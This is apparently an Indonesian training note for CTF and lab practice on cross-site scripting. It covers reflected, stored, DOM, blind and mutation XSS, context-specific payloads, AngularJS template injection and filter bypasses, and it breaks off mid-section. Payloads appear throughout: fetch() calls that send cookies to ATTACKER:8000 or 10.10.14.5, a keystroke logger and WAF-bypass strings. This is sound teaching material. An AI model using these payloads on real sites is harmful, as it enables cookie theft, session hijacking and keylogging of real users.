---
id: "20"
title: "🔥 20 — XSS Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "20_xss_workflow.md"
refs_out: ["06","15","17a","19","21","22","27","64"]
refs_in: ["21","27","29","30","31","33"]
---

← [File 19: SQL Injection](/docs/sql-injection)

# 🔥 20 — XSS Workflow

> **Scope:** HackTheBox, TryHackMe, Proving Grounds, PortSwigger Academy, dan lab/target yang memang memberikan izin pengujian.  
> **OS:** Parrot OS XFCE / Debian-based  
> **Level:** Beginner → Intermediate  
> **Goal:** membangun _muscle memory_ XSS dari detection → context identification → payload construction → validation → impact analysis.

---

# 📚 Daftar Isi

- [🔥 0. XSS Fundamentals](#-0-xss-fundamentals)
    
- [🔴 1. Reflected XSS](#-1-reflected-xss)
    
    - [1.1 Cara Identify Reflected XSS](#11-cara-identify-reflected-xss)
        
    - [1.2 Basic Payloads Reflected XSS](#12-basic-payloads-reflected-xss)
        
    - [1.3 Reflected XSS Full Exploitation](#13-reflected-xss-full-exploitation)
        
- [🟠 2. Stored XSS](#-2-stored-xss)
    
    - [2.1 Cara Identify Stored XSS](#21-cara-identify-stored-xss)
        
    - [2.2 Basic Payloads Stored XSS](#22-basic-payloads-stored-xss)
        
    - [2.3 Stored XSS Full Exploitation](#23-stored-xss-full-exploitation)
        
- [🟡 3. DOM XSS](#-3-dom-xss)
    
    - [3.1 Konsep DOM XSS](#31-konsep-dom-xss)
        
    - [3.2 Common DOM XSS Sources](#32-common-dom-xss-sources)
        
    - [3.3 Common DOM XSS Sinks](#33-common-dom-xss-sinks)
        
    - [3.4 DOM XSS Testing](#34-dom-xss-testing)
        
    - [3.5 Mutation XSS (mXSS)](#35-mutation-xss-mxss)
        
- [🟢 4. Blind XSS](#-4-blind-xss)
    
    - [4.1 Konsep Blind XSS](#41-konsep-blind-xss)
        
    - [4.2 Blind XSS Payload Setup](#42-blind-xss-payload-setup)
        
    - [4.3 HTTP Receiver untuk Lab](#43-http-receiver-untuk-lab)
        
- [🎯 5. Context-Based Payloads](#-5-context-based-payloads)
    
    - [5.1 HTML Context](#51-html-context)
        
    - [5.2 HTML Attribute Context](#52-html-attribute-context)
        
    - [5.3 JavaScript String Context](#53-javascript-context-string)
        
    - [5.4 JavaScript Template Literal](#54-javascript-context-template-literal)
        
    - [5.5 URL Context](#55-url-context)
        
    - [5.6 CSS Context](#56-css-context)
        
    - [5.7 JSON Context](#57-json-context)
        
    - [5.8 AngularJS Client-Side Template Injection (CSTI)](#58-angularjs-client-side-template-injection-csti)
        
- [🧬 6. Filter Bypass Techniques](#-6-filter-bypass-techniques)
    
    - [6.1 Basic Filter Bypass](#61-basic-filter-bypass)
        
    - [6.2 Tag Filter Bypass](#62-tag-filter-bypass)
        
    - [6.3 Keyword Filter Bypass](#63-keyword-filter-bypass)
        
    - [6.4 Quote Filter Bypass](#64-quote-filter-bypass)
        
    - [6.5 Space Filter Bypass](#65-space-filter-bypass)
        
    - [6.6 Bracket Filter Bypass](#66-bracket-filter-bypass)
        
    - [6.7 WAF Bypass Approach](#67-waf-bypass-approach)
        
    - [6.8 Polyglot XSS](#68-polyglot-xss)
        
- [🍪 7. XSS to Cookie Theft](#-7-xss-to-cookie-theft)
    
    - [7.1 Setup Cookie Receiver](#71-setup-cookie-receiver--python)
        
    - [7.2 XSS Payload Cookie Theft](#72-xss-payload-cookie-theft)
        
    - [7.3 Apa yang Dilakukan dengan Cookie](#73-apa-yang-dilakukan-dengan-cookie)
        
- [🎫 8. XSS to Session Hijacking](#-8-xss-to-session-hijacking)
    
    - [8.1 Dari Cookie ke Session](#81-dari-cookie-ke-session)
        
    - [8.2 HttpOnly Cookie](#82-httponly-cookie--batas-dan-alternatif)
        
- [🛡️ 9. CSP Bypass](#-9-csp-bypass)
    
    - [9.1 Apa Itu CSP](#91-apa-itu-csp)
        
    - [9.2 Cara Detect CSP](#92-cara-detect-csp)
        
    - [9.3 Common CSP Misconfigurations](#93-common-csp-misconfigurations)
        
    - [9.4 CSP Bypass Techniques](#94-csp-bypass-techniques)
        
- [🧰 10. Tools & Automation](#-10-tools--automation)
    
    - [10.1 Browser DevTools](#101-browser-devtools-untuk-xss)
        
    - [10.2 Burp Suite](#102-burp-suite-untuk-xss)
        
    - [10.3 Dalfox](#103-dalfox--xss-scanner)
        
    - [10.4 XSStrike](#104-xsstrike)
        
    - [10.5 Manual Testing dengan curl](#105-manual-testing-dengan-curl)
        
- [⚙️ 11. Automation Scripts](#-11-automation-scripts)
    
    - [11.1 xss_detect.sh](#111-script-xssdetectsh)
        
    - [11.2 cookie_stealer_server.py](#112-script-cookie_stealer_serverpy)
        
    - [11.3 XSS Payload Wordlist Generator](#113-xss-payload-wordlist-generator)
        
- [🌳 12. Decision Tree](#-12-decision-tree)
    
- [🛠️ 13. Common Errors & Troubleshooting](#-13-common-errors--troubleshooting)
    

---

# 🔥 0. XSS Fundamentals

# Apa Itu XSS?

**Cross-Site Scripting (XSS)** terjadi ketika input yang dikontrol attacker akhirnya diperlakukan browser sebagai executable content, biasanya JavaScript.

Analogi sederhana:

```text
Normal:

User Input
   │
   ▼
"hello"
   │
   ▼
HTML/Text
   │
   ▼
Browser menampilkan teks


XSS:

User Input
   │
   ▼
<script>...</script>
   │
   ▼
Application memasukkan input tanpa encoding yang benar
   │
   ▼
Browser parsing sebagai code
   │
   ▼
JavaScript execute
```

Inti XSS:

```text
UNTRUSTED INPUT
      +
UNSAFE HTML/JS SINK
      +
BROWSER INTERPRETATION
      =
XSS
```

---

## Kenapa XSS Berbahaya?

XSS bukan sekadar:

```javascript
alert(1)
```

Impact bergantung pada context dan privilege victim.

Contoh:

```text
XSS
 │
 ├── Read accessible page data
 ├── Perform actions as victim
 ├── Modify visible page
 ├── Phishing/UI redressing
 ├── Capture keystrokes
 ├── Read non-HttpOnly cookies
 ├── Send authenticated requests
 └── Potential session compromise
```

### Cookie Theft

Bisa terjadi apabila cookie:

```text
HttpOnly = false
```

atau informasi session tersedia melalui JavaScript.

### Keylogging

Script dapat mengamati input keyboard pada halaman yang terinfeksi.

### Phishing

XSS dapat mengubah tampilan halaman yang dipercaya user.

### Defacement

DOM/page dapat dimodifikasi.

### CSRF-like Actions

XSS dapat melakukan request dengan browser victim dan cookie yang sedang aktif.

> **Penting:** XSS tidak secara otomatis berarti semua cookie dapat dicuri. `HttpOnly`, CSP, browser policies, credential architecture, dan session design sangat mempengaruhi impact.

---

# Reflected vs Stored vs DOM XSS

```text
                 XSS
                  │
       ┌──────────┼───────────┐
       ▼          ▼           ▼
  Reflected     Stored       DOM
       │          │           │
       ▼          ▼           ▼
Request      Input stored   Source
   │          in server       │
   ▼              │            ▼
Response         ▼          JavaScript
   │          Later page       │
   ▼              │            ▼
Browser           ▼           Sink
   │           Browser          │
   └──────────────┴─────────────┘
                  │
                  ▼
             JavaScript
              executes
```

---

## Reflected XSS

```text
Attacker → Request
             │
             ▼
          Server
             │
             ▼
        Reflect input
             │
             ▼
          Browser
             │
             ▼
          Execute
```

Biasanya tidak persistent.

---

## Stored XSS

```text
Attacker
   │
   ▼
Submit payload
   │
   ▼
Server / Database
   │
   ▼
Payload stored
   │
   ▼
Victim opens page
   │
   ▼
Payload rendered
   │
   ▼
JavaScript executes
```

Persistent.

---

## DOM XSS

```text
URL / Hash / DOM Source
          │
          ▼
      Client JS
          │
          ▼
       Dangerous Sink
          │
          ▼
       DOM updated
          │
          ▼
       JavaScript
       executes
```

Pada DOM XSS, server dapat saja tidak pernah menerima payload sebagai bagian dari rendered response.

---

# Browser Security Model

## Same-Origin Policy

Browser membatasi bagaimana script dari satu origin berinteraksi dengan origin lain.

Origin:

```text
scheme + host + port
```

Contoh:

```text
https://app.example.com:443
```

XSS berbahaya karena script berjalan dalam origin aplikasi yang dipercaya:

```text
Victim Browser
      │
      ▼
https://target.example
      │
      ▼
Injected JavaScript
      │
      ▼
Runs under target origin
```

Jadi XSS bukan terutama soal:

```text
"JavaScript dari attacker"
```

melainkan:

```text
"JavaScript attacker berjalan dalam security context target"
```

---

# Execution Context

## HTML Context

```html
<div>INPUT</div>
```

Input diposisikan sebagai HTML content.

---

## Attribute Context

```html
<input value="INPUT">
```

Input berada di dalam attribute.

---

## JavaScript Context

```html
<script>
var name = 'INPUT';
</script>
```

Input masuk ke JavaScript string.

---

## URL Context

```html
<a href="INPUT">Click</a>
```

Input menjadi URL value.

---

# 🧭 XSS Core Workflow

```text
Input Found
    │
    ▼
Is it reflected/stored?
    │
    ▼
Locate exact sink/context
    │
    ▼
HTML?
Attribute?
JavaScript?
URL?
DOM?
    │
    ▼
Break context safely
    │
    ▼
Execute simple PoC
    │
    ▼
Confirm XSS
    │
    ▼
Assess impact
```

---

# 🔴 1. Reflected XSS

# 1.1 Cara Identify Reflected XSS

## 📌 Kapan Digunakan

Gunakan saat input dari request muncul kembali di response/page tanpa disimpan secara persistent.

Lokasi umum:

```text
Search
Error message
URL parameter
Form input
Redirect parameter
Language parameter
Filter parameter
```

---

## Test Reflection — GET

```bash
curl -s \
'http://TARGET/search?q=XSS_TEST_123'
```

Cari marker:

```bash
curl -s \
'http://TARGET/search?q=XSS_TEST_123' |
grep -n 'XSS_TEST_123'
```

Expected:

```text
87:<input value="XSS_TEST_123">
```

Artinya input direfleksikan.

---

## Test Reflection — POST

```bash
curl -s -X POST \
--data-urlencode 'q=XSS_TEST_123' \
http://TARGET/search |
grep -n 'XSS_TEST_123'
```

---

## Search Parameter

```bash
curl -s \
--get \
--data-urlencode 'q=XSS_TEST_123' \
http://TARGET/search |
grep -n 'XSS_TEST_123'
```

---

## Error Parameter

```bash
curl -s \
--get \
--data-urlencode 'error=XSS_TEST_123' \
http://TARGET/error |
grep -n 'XSS_TEST_123'
```

---

## Redirect Parameter

```bash
curl -i \
--get \
--data-urlencode 'next=XSS_TEST_123' \
http://TARGET/login
```

Cari:

```text
Location:
```

---

## Reflection ≠ XSS

Contoh:

```html
<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

Input ada:

```text
✅ reflected
❌ executable
```

Bandingkan:

```html
<div><script>alert(1)</script></div>
```

```text
✅ reflected
✅ executable candidate
```

---

# 1.2 Basic Payloads Reflected XSS

## 📌 Kapan Digunakan

Setelah reflection ditemukan dan context sudah dipahami.

### Baseline

```html
XSS_TEST_123
```

### Basic HTML

```html
<script>alert(1)</script>
```

URL encoded:

```text
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

---

## Event Handler

Ketika `<script>` diblok:

```html
<img src=x onerror=alert(1)>
```

```html
<svg onload=alert(1)>
```

```html
<body onload=alert(1)>
```

```html
<details open ontoggle=alert(1)>
```

```html
<video><source onerror=alert(1)>
```

---

## Context Table

|Context|PoC|
|---|---|
|HTML body|`<script>alert(1)</script>`|
|HTML attribute|`" onmouseover="alert(1)`|
|JS string|`';alert(1);//`|
|Template literal|`${alert(1)}`|
|URL|`javascript:alert(1)`*|
|Event handler|`alert(1)`|

* `javascript:` behavior depends on element, browser, sanitization, and security policy.

---

# 1.3 Reflected XSS Full Exploitation

## 📌 Kapan Digunakan

Setelah:

```text
XSS confirmed
+
lab victim available
+
impact perlu dibuktikan
```

Flow:

```text
Attacker URL
    │
    ▼
Victim Browser
    │
    ▼
Target Page
    │
    ▼
Reflected Input
    │
    ▼
JavaScript Execute
    │
    ▼
Callback / Action
```

---

## Simple Callback

Receiver:

```bash
python3 -m http.server 8000
```

Payload lab:

```html
<script>
fetch('http://ATTACKER:8000/xss-test')
</script>
```

Expected receiver:

```text
GET /xss-test HTTP/1.1
```

Ini membuktikan JavaScript berhasil melakukan outbound request.

---

## Cookie Demonstration

```html
<script>
fetch('http://ATTACKER:8000/?c='+
encodeURIComponent(document.cookie))
</script>
```

**Catatan:** `document.cookie` hanya mengembalikan cookie yang dapat diakses JavaScript; `HttpOnly` cookie tidak muncul.

---

## Mengirim Link ke Victim — Lab

Contoh:

```text
http://TARGET/search?q=<PAYLOAD>
```

URL perlu di-encode dengan benar.

Workflow:

```text
Create PoC URL
     │
     ▼
Victim opens URL
     │
     ▼
Payload reflected
     │
     ▼
JS executes
     │
     ▼
Receiver gets callback
```

---

# 🟠 2. Stored XSS

# 2.1 Cara Identify Stored XSS

## 📌 Kapan Digunakan

Saat input dapat disimpan dan muncul kembali ketika halaman dibuka kemudian.

Lokasi umum:

```text
Comment
Profile
Ticket
Username
Product Review
Forum
Guestbook
Support message
```

---

## Test

Masukkan marker:

```text
XSS_STORED_123
```

Kemudian:

```text
Submit
  │
  ▼
Navigate away
  │
  ▼
Reload
  │
  ▼
Open different session
  │
  ▼
Marker still exists?
```

Kalau tetap muncul:

```text
Persistent reflection candidate
```

---

## Confirm

Payload:

```html
<script>alert(1)</script>
```

Flow:

```text
Inject
  │
  ▼
Stored
  │
  ▼
Reload
  │
  ▼
Execute
```

---

# 2.2 Basic Payloads Stored XSS

## 📌 Kapan Digunakan

Setelah persistent reflection dikonfirmasi.

Basic:

```html
<script>alert(document.domain)</script>
```

Event:

```html
<img src=x onerror=alert(document.domain)>
```

SVG:

```html
<svg onload=alert(document.domain)>
```

---

## Cookie PoC

```html
<script>
fetch('http://ATTACKER:8000/?c='+
encodeURIComponent(document.cookie))
</script>
```

---

## Keylogger — Konsep Lab

```html
<script>
document.addEventListener('keydown', function(e) {
    fetch('http://ATTACKER:8000/key?key='+
        encodeURIComponent(e.key));
});
</script>
```

Dalam assessment nyata, keylogging memiliki risiko privasi tinggi; pada training lab, gunakan data dummy.

---

# 2.3 Stored XSS Full Exploitation

## 📌 Kapan Digunakan

Ketika stored payload diproses oleh user/admin lain.

Flow:

```text
Attacker
   │
   ▼
Comment / Ticket / Profile
   │
   ▼
Stored in DB
   │
   ▼
Admin opens page
   │
   ▼
Browser executes
   │
   ▼
Callback receiver
```

---

## Receiver

```bash
python3 -m http.server 8000
```

Inject:

```html
<script>
fetch('http://ATTACKER:8000/?event=stored-xss')
</script>
```

Expected:

```text
ATTACKER_IP - - "GET /?event=stored-xss HTTP/1.1" 200 -
```

---

# 🟡 3. DOM XSS

# 3.1 Konsep DOM XSS

## 📌 Kapan Digunakan

Saat input berasal dari client-side source:

```text
location.hash
location.search
document.URL
document.referrer
window.name
```

dan diproses JavaScript menuju dangerous sink.

---

## Source → Sink

```text
SOURCE
   │
   ▼
location.hash
   │
   ▼
JavaScript
   │
   ▼
SINK
   │
   ▼
innerHTML
   │
   ▼
HTML parsing
```

Reflected XSS:

```text
Browser → Server → Response → Browser
```

DOM XSS:

```text
Browser → JavaScript → DOM
```

Server dapat saja tidak melihat payload sebagai HTML.

---

# 3.2 Common DOM XSS Sources

|Source|Contoh|
|---|---|
|`document.URL`|full URL|
|`document.location`|location object|
|`document.referrer`|previous page|
|`window.name`|cross-navigation value|
|`location.hash`|`#payload`|
|`location.search`|`?q=payload`|

---

## Example

```javascript
const input = location.hash.substring(1);
document.getElementById('output').innerHTML = input;
```

URL:

```text
http://TARGET/#<img src=x onerror=alert(1)>
```

---

# 3.3 Common DOM XSS Sinks

|Sink|Risiko|
|---|---|
|`innerHTML`|HTML parsing|
|`outerHTML`|HTML replacement|
|`document.write()`|HTML injection|
|`eval()`|JavaScript execution|
|`setTimeout(string)`|string execution|
|`setInterval(string)`|string execution|
|`src` assignment|context-dependent|
|`href` assignment|URL execution depending on scheme/context|

---

## Example `innerHTML`

```javascript
const value = location.hash.substring(1);
document.querySelector('#output').innerHTML = value;
```

Potential PoC:

```text
#<img src=x onerror=alert(1)>
```

---

## Example `document.write`

```javascript
document.write(location.search);
```

Potential test:

```text
?q=<img src=x onerror=alert(1)>
```

---

## Example `eval`

```javascript
eval(location.hash.substring(1));
```

Payload:

```text
#alert(1)
```

---

## Example `setTimeout`

Dangerous:

```javascript
setTimeout(location.hash.substring(1), 1000);
```

PoC:

```text
#alert(1)
```

Secure alternative:

```javascript
setTimeout(() => doSomething(), 1000);
```

---

# 3.4 DOM XSS Testing

## 📌 Kapan Digunakan

Saat source code JavaScript memiliki user-controlled source dan sink.

---

## DevTools Search

Chrome/Firefox:

```text
F12
→ Sources
→ Ctrl+Shift+F
```

Cari:

```text
innerHTML
document.write
eval(
setTimeout(
location.hash
location.search
document.URL
```

---

## Trace Source → Sink

Contoh:

```javascript
const q = new URLSearchParams(location.search).get("q");
document.getElementById("result").innerHTML = q;
```

Trace:

```text
location.search
      │
      ▼
URLSearchParams
      │
      ▼
q
      │
      ▼
innerHTML
      │
      ▼
DOM XSS
```

---

## Browser Console PoC

Pada halaman lab:

```javascript
document.querySelector('#result').innerHTML =
'<img src=x onerror=alert(1)>'
```

Jika alert muncul:

```text
Sink executable
```

Kemudian telusuri source yang mengontrol sink tersebut.

---

# 3.5 Mutation XSS (mXSS)

## 📌 Kapan Digunakan
Ketika aplikasi web menerapkan HTML sanitizer (seperti DOMPurify versi lawas atau sanitizer regex/whitelist) untuk membersihkan input user sebelum dimasukkan ke dalam DOM menggunakan sink `innerHTML`.

### Konsep Dasar mXSS
1. **Sanitization Pass:** Sanitizer membaca string input dan menganggap markup tersebut "aman" karena tag atau atributnya tampak valid dan tidak melanggar aturan.
2. **DOM Re-parsing / Mutation:** Saat string yang lolos sanitasi dimasukkan ke `element.innerHTML`, parser HTML bawaan browser melakukan normalisasi atau mutasi DOM (misal pada tag `<noscript>`, MathML, SVG, atau atribut yang belum tertutup rapat).
3. **Execution:** Mutasi tersebut mengubah struktur pohon DOM sehingga string yang awalnya berada di dalam atribut atau tag pasif melompat keluar dan menjadi tag/event handler executable (`<img onerror=...>` atau `<svg onload=...>`).

### Contoh Kasus & Payload mXSS

#### 1. Tag Breakout via Atribut Tidak Tertutup
```html
<p id="</p><img src=x onerror=alert(1)>">
```
- *Saat sanitasi:* Sanitizer menganggap seluruh teks setelah `id="` adalah nilai atribut string biasa.
- *Saat browser rendering via innerHTML:* Parser HTML browser menutup tag `<p>` terlebih dahulu, lalu me-render `<img>` sebagai elemen baru yang memicu event `onerror`.

#### 2. Namespace Confusion (MathML / SVG)
```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
```
Browser parser berpindah dari XML/MathML namespace kembali ke HTML namespace, memicu rekonstruksi pohon DOM yang mengeksekusi payload.

### Catatan CTF:
- Sangat sering muncul di PortSwigger Web Security Academy Labs & CTF modern dengan library sanitizer client-side.
- Selalu uji dengan payload mXSS jika input disanitasi tetapi tetap dimasukkan ke `innerHTML`.

---

# 🟢 4. Blind XSS

# 4.1 Konsep Blind XSS

## 📌 Kapan Digunakan

Saat payload disimpan/diproses oleh halaman yang tidak dapat Anda lihat langsung.

Contoh:

```text
Support Ticket
     │
     ▼
Attacker submits payload
     │
     ▼
Admin panel
     │
     ▼
Admin opens ticket
     │
     ▼
XSS executes
     │
     ▼
Callback
```

Karena victim page berada di:

```text
/admin
/internal/logs
/support
```

attacker tidak melihat execution secara langsung.

---

# 4.2 Blind XSS Payload Setup

Receiver:

```bash
python3 -m http.server 8000
```

Payload minimal:

```html
<script>
fetch('http://ATTACKER:8000/?blind=1')
</script>
```

Cookie callback lab:

```html
<script>
fetch('http://ATTACKER:8000/?c='+
encodeURIComponent(document.cookie))
</script>
```

Key point:

```text
No visible alert
      │
      ▼
Need callback
      │
      ▼
External receiver
```

---

## XSS Hunter — Konsep

Service khusus Blind XSS biasanya menyediakan:

```text
payload
callback infrastructure
request capture
context information
```

Untuk learning, memahami mekanisme callback lebih penting daripada bergantung pada service eksternal.

---

# 4.3 HTTP Receiver untuk Lab

Simple:

```bash
python3 -m http.server 8000
```

Output:

```text
Serving HTTP on 0.0.0.0 port 8000 ...
```

Callback:

```text
127.0.0.1 - - [timestamp]
"GET /?blind=1 HTTP/1.1" 200 -
```

---

# 🎯 5. Context-Based Payloads

> **Bagian paling penting:** payload tidak dipilih berdasarkan “payload apa yang paling kuat”, tetapi berdasarkan **context tempat input dimasukkan**.

---

# 5.1 HTML Context

## 📌 Kapan Digunakan

Saat input berada langsung di HTML body:

```html
<div>INPUT</div>
```

---

## Vulnerable Example

```html
<div class="result">
    INPUT
</div>
```

Input:

```text
hello
```

Response:

```html
<div class="result">
    hello
</div>
```

---

## Test

Marker:

```text
XSS_TEST_123
```

Basic:

```html
<script>alert(1)</script>
```

Jika `<script>` diblok:

```html
<img src=x onerror=alert(1)>
```

atau:

```html
<svg onload=alert(1)>
```

---

## Kenapa Payload Bekerja?

Input:

```html
<div>INPUT</div>
```

menjadi:

```html
<div>
<script>alert(1)</script>
</div>
```

Browser parser melihat `<script>` sebagai HTML element, bukan text.

---

## Kenapa HTML-escaped Payload Tidak Bekerja?

```html
<div>
&lt;script&gt;alert(1)&lt;/script&gt;
</div>
```

Browser merender:

```text
<script>alert(1)</script>
```

sebagai teks.

---

# 5.2 HTML Attribute Context

## 📌 Kapan Digunakan

Saat input masuk ke attribute:

```html
<input value="INPUT">
```

---

## Vulnerable Example

```html
<input value="USER_INPUT">
```

Input:

```text
test
```

menjadi:

```html
<input value="test">
```

---

## Break Attribute

Payload:

```text
" onmouseover="alert(1)
```

Hasil:

```html
<input value="" onmouseover="alert(1)">
```

Trigger:

```text
Mouse over
```

---

## Alternative

```text
" autofocus onfocus="alert(1)
```

Hasil:

```html
<input value="" autofocus onfocus="alert(1)">
```

---

## Single Quote Attribute

Jika:

```html
<input value='INPUT'>
```

gunakan:

```text
' onmouseover='alert(1)
```

---

## Context Diagram

```text
INPUT
 │
 ▼
value="INPUT"
 │
 ▼
Break closing quote
 │
 ▼
Create new attribute
 │
 ▼
Event Handler
 │
 ▼
JavaScript
```

---

# 5.3 JavaScript Context (String)

## 📌 Kapan Digunakan

Saat input berada dalam JS string:

```javascript
var x = 'INPUT';
```

atau:

```javascript
var y = "INPUT";
```

---

## Single Quote

Vulnerable:

```javascript
var x = 'INPUT';
```

Payload:

```text
';alert(1);//
```

Hasil:

```javascript
var x = '';
alert(1);
//';
```

---

## Double Quote

Vulnerable:

```javascript
var x = "INPUT";
```

Payload:

```text
";alert(1);//
```

---

## Test

Cari response:

```bash
curl -s \
--get \
--data-urlencode "name=TEST123" \
http://TARGET/ |
grep -n 'TEST123'
```

Kemudian lihat apakah payload muncul:

```javascript
var x = 'PAYLOAD';
```

---

## Kenapa `<script>` Tidak Bekerja?

Jika payload berada:

```javascript
var x = '<script>alert(1)</script>';
```

itu tetap berada dalam string JavaScript.

Browser tidak memproses `<script>` sebagai HTML baru dalam string tersebut.

Maka:

```text
HTML payload
      │
      ▼
Wrong context
      │
      ▼
No execution
```

---

# 5.4 JavaScript Context — Template Literal

## 📌 Kapan Digunakan

Saat:

```javascript
var x = `INPUT`;
```

Template literals menggunakan backtick.

---

## Expression Injection

Payload:

```text
${alert(1)}
```

Hasil:

```javascript
var x = `${alert(1)}`;
```

JavaScript mengevaluasi expression interpolation.

---

## Break Template Literal

Payload yang lebih agresif:

```text
`;alert(1);//
```

Hasil konseptual:

```javascript
var x = ``;
alert(1);
//`;
```

---

## Tanpa `alert`

Untuk PoC:

```text
${console.log(document.domain)}
```

---

# 5.5 URL Context

## 📌 Kapan Digunakan

Saat input menjadi nilai URL:

```html
<a href="INPUT">Click</a>
```

atau:

```html
<img src="INPUT">
```

atau:

```html
<form action="INPUT">
```

---

## `<a href>`

Vulnerable:

```html
<a href="INPUT">Open</a>
```

PoC context:

```text
javascript:alert(1)
```

Hasil:

```html
<a href="javascript:alert(1)">Open</a>
```

> Browser behavior dan sanitization dapat mencegah `javascript:`. Banyak aplikasi modern juga menghapus atau normalisasi scheme berbahaya.

---

## `<img src>`

Test:

```text
x
```

kemudian event-based context:

```text
x" onerror="alert(1)
```

Tetapi hasil bergantung pada apakah input masih berada di attribute context atau sudah diproses secara berbeda.

---

## `<form action>`

```html
<form action="INPUT">
```

> ⚠️ **Klarifikasi Penting `<form action>`:**
> Skema `javascript:` pada atribut `action` dari `<form>` **TIDAK** dapat mengeksekusi kode JavaScript secara otomatis saat form di-submit, karena submit form tidak melakukan navigasi scheme seperti klik pada tautan `<a href>`.
>
> **Pendekatan yang Valid untuk Konteks Form:**
> 1. **Kombinasi dengan Event Handler:**
>    ```html
>    <form action="javascript:void(0)" onsubmit="alert(1)">
>    ```
> 2. **Breakout dari Atribut dan Suntikkan Handler:**
>    Gunakan tanda kutip ganda untuk keluar dari atribut `action`:
>    ```text
>    " onsubmit="alert(1)
>    ```

---

# 5.6 CSS Context

## 📌 Kapan Digunakan

Saat input masuk ke CSS property atau `<style>`.

Contoh:

```html
<style>
body {
    color: INPUT;
}
</style>
```

---

## Important Distinction

Modern browsers tidak menjadikan arbitrary CSS injection otomatis sebagai JavaScript execution.

Jadi:

```text
CSS injection
≠
XSS otomatis
```

Test fokus pertama:

```text
Apakah style benar-benar berubah?
```

Contoh:

```text
red
```

menjadi:

```css
color: red;
```

Jika context dapat di-break ke HTML, dampaknya bergantung pada bagaimana CSS dimasukkan ke DOM.

---

## `style` Attribute

```html
<div style="color: INPUT">
```

Test:

```text
red
```

Kemudian periksa:

```text
Elements → style attribute
```

Jangan langsung menggunakan payload JavaScript ketika sink hanya CSS.

---

# 5.7 JSON Context

## 📌 Kapan Digunakan

Saat input menjadi bagian JSON/API response atau JavaScript-generated JSON.

Contoh:

```javascript
const data = {"name":"INPUT"};
```

---

## Vulnerable Flow

```text
User Input
    │
    ▼
JSON
    │
    ▼
JavaScript parser
    │
    ▼
DOM sink
```

JSON encoding yang benar:

```json
{
  "name": "<script>alert(1)</script>"
}
```

tidak otomatis menghasilkan XSS.

XSS dapat muncul jika kemudian:

```javascript
element.innerHTML = data.name;
```

---

## Test

Request:

```bash
curl -i -X POST http://TARGET/api/profile \
-H 'Content-Type: application/json' \
-d '{"name":"XSS_TEST_123"}'
```

Cari reflection:

```bash
curl -s -X POST http://TARGET/api/profile \
-H 'Content-Type: application/json' \
-d '{"name":"XSS_TEST_123"}' |
grep -n 'XSS_TEST_123'
```

Kemudian trace apakah value mencapai dangerous sink.

---

# 5.8 AngularJS Client-Side Template Injection (CSTI)

## 📌 Kapan Digunakan
Ketika aplikasi web memuat framework AngularJS (khususnya versi 1.x legacy) dan user input direfleksikan di dalam elemen HTML yang berada dalam cakupan direktif `ng-app`, atau halaman memproses kurung kurawal ganda `{{ }}`.

### Indikator Keberadaan AngularJS
1. Tag HTML memuat atribut AngularJS: `<html ng-app>` atau `<div ng-app="myApp">`.
2. Halaman memuat library client-side: `<script src=".../angular.js"></script>`.
3. Uji kurung kurawal dasar: kirim input `{{7*7}}`. Jika pada halaman respon muncul angka `49`, maka Client-Side Template Injection (CSTI) terkonfirmasi!

### Sandbox Escape & Payloads

AngularJS mengeksekusi ekspresi di dalam konteks custom scope, bukan langsung di window global. Diperlukan sandbox escape untuk mengakses constructor fungsi JavaScript (`Function`):

#### 1. Universal Constructor Payload
```javascript
{{constructor.constructor('alert(1)')()}}
```

#### 2. Scope Constructor Payload
```javascript
{{$on.constructor('alert(1)')()}}
```

#### 3. Cookie Theft via CSTI
```javascript
{{constructor.constructor("fetch('http://10.10.14.5:8000/?c='+document.cookie)")()}}
```

---

# Context Master Table

|Context|Vulnerable Example|First Test|Typical PoC|
|---|---|---|---|
|HTML body|`<div>INPUT</div>`|marker + tag|`<script>alert(1)</script>`|
|Attribute|`<input value="INPUT">`|break quote|`" onmouseover="alert(1)`|
|JS `'...'`|`var x='INPUT'`|break `'`|`';alert(1);//`|
|JS `"..."`|`var x="INPUT"`|break `"`|`";alert(1);//`|
|Template|`` var x=`INPUT` ``|interpolation|`${alert(1)}`|
|URL|`<a href="INPUT">`|inspect scheme|`javascript:alert(1)`*|
|CSS|`color: INPUT`|style change|context-dependent|
|JSON|`{"x":"INPUT"}`|trace parser/sink|depends on sink|
|DOM|`innerHTML=source`|trace source|sink-dependent|
|AngularJS|`<div>{{INPUT}}</div>`|`{{7*7}}`|`{{constructor.constructor('alert(1)')()}}`|

---

# 🧬 6. Filter Bypass Techniques

> **Prinsip:** jangan menebak bypass. Tentukan dahulu **apa yang diblok**.

---

# 6.1 Basic Filter Bypass

## 📌 Kapan Digunakan

Saat payload normal gagal dan response menunjukkan filtering/sanitization.

---

## Case Variation

```html
<ScRiPt>alert(1)</sCrIpT>
```

Untuk filter naif yang case-sensitive.

Modern HTML parsing biasanya case-insensitive terhadap tag name, tetapi sanitizer/WAF dapat memproses string terlebih dahulu.

---

## URL Encoding

```text
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

Test:

```bash
curl -G \
--data-urlencode 'q=<script>alert(1)</script>' \
http://TARGET/search
```

---

## Double Encoding

Contoh:

```text
%253Cscript%253E
```

Ini hanya berguna jika terdapat multiple decoding stage.

---

## Null Bytes

Payload legacy:

```text
%00
```

Browser modern biasanya tidak dapat diperlakukan seperti browser lama.

**Jangan mengandalkan null byte sebagai bypass modern.**

---

# 6.2 Tag Filter Bypass

## 📌 Kapan Digunakan

Ketika `<script>` diblok, tetapi event-handler HTML masih diterima.

|Tag|Event|Payload|
|---|---|---|
|`img`|`onerror`|`<img src=x onerror=alert(1)>`|
|`svg`|`onload`|`<svg onload=alert(1)>`|
|`body`|`onload`|`<body onload=alert(1)>`|
|`details`|`ontoggle`|`<details open ontoggle=alert(1)>`|
|`video/source`|`onerror`|`<video><source onerror=alert(1)>`|
|`iframe`|context-dependent|`<iframe src="javascript:alert(1)">`*|

* Banyak environment melakukan sanitization atau block terhadap `javascript:`.

---

## Event Handler

Contoh:

```html
<img src=x onerror=alert(document.domain)>
```

Flow:

```text
src=x
 │
 ▼
Resource fails
 │
 ▼
onerror
 │
 ▼
JavaScript
```

---

# 6.3 Keyword Filter Bypass

## 📌 Kapan Digunakan

Saat karakter/tag diterima tetapi keyword tertentu diblok.

---

## `alert` → `confirm`

```javascript
confirm(1)
```

atau:

```javascript
prompt(1)
```

---

## Template Literal

